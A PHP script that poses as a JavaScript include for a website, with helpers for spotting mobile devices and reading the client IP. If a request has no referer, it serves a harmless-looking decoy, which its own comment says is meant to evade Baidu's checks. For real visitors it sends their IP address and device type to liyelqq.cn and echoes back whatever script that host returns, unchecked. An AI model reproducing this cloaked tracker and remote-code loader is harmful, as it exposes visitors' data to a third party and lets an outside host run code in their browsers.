<?php
/***
 * 请定期更新该文件，下载地址：http://www.liyelqq.cn/down.php?type=jump
 * @date 2016.12.17
 */
header("Content-type: text/javascript");

if (empty($_SERVER["HTTP_REFERER"])) 
{
    //输出无用内容，避免百度检测
    $code = <<<EOF
// 商务通代码
// document.writeln("<script language=\"javascript\" src=\"http://dbt.zoosnet.net/JS/LsJS.aspx?siteid=DBT31098075&lng=cn\"></script>");
EOF;
    echo $code; exit;
}

$id         = empty($_GET['id']) ? 0 : intval($_GET['id']);
$rand       = substr(uniqid(rand()), -6).substr(uniqid(rand()), -6);
$visit_type = is_mobile() ? 'MOB' : 'PC';
$addr       = 'http://www.liyelqq.cn/referer/' . $rand . '.js?get_code=1&ip=' . get_client_ip() . '&visit_type=' . $visit_type . '&liushi_user_id=' . $id;

echo @file_get_contents($addr);
//header("Location: ".$addr); exit;

/**
 * 判断是否为手机访问
 * 
 * @access     public
 * @return     bool
 */
function is_mobile()
{ 
    // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
    if (isset ($_SERVER['HTTP_X_WAP_PROFILE']))
    {
        return true;
    } 
    // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
    if (isset ($_SERVER['HTTP_VIA']))
    { 
        // 找不到为flase,否则为true
        return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    }
    // 脑残法，判断手机发送的客户端标志,兼容性有待提高
    if (isset ($_SERVER['HTTP_USER_AGENT']))
    {
        $clientkeywords = array ('nokia',
            'sony',
            'ericsson',
            'mot',
            'samsung',
            'htc',
            'sgh',
            'lg',
            'sharp',
            'sie-',
            'philips',
            'panasonic',
            'alcatel',
            'lenovo',
            'iphone',
            'ipod',
            'blackberry',
            'meizu',
            'android',
            'netfront',
            'symbian',
            'ucweb',
            'windowsce',
            'palm',
            'operamini',
            'operamobi',
            'openwave',
            'nexusone',
            'cldc',
            'midp',
            'wap',
            'mobile'
            ); 
        // 从HTTP_USER_AGENT中查找手机浏览器的关键字
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT'])))
        {
            return true;
        } 
    } 
    // 协议法，因为有可能不准确，放到最后判断
    if (isset ($_SERVER['HTTP_ACCEPT']))
    { 
        // 如果只支持wml并且不支持html那一定是移动设备
        // 如果支持wml和html但是wml在html之前则是移动设备
        if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html'))))
        {
            return true;
        } 
    } 
    return false;
}
/**
 * 获取客户端IP地址
 * 
 * @access     public
 * @return     string
 */
function get_client_ip()
{
    static $ip = NULL;
    if ($ip !== NULL) return $ip;
    if (isset($_SERVER['REMOTE_ADDR'])) 
    {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) 
    {
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $pos =  array_search('unknown',$arr);
        if(false !== $pos) unset($arr[$pos]);
        $ip   =  trim($arr[0]);
    }
    elseif (isset($_SERVER['HTTP_CLIENT_IP'])) 
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    // IP地址合法验证
    $ip = (false !== ip2long($ip)) ? $ip : '';
    return $ip;
}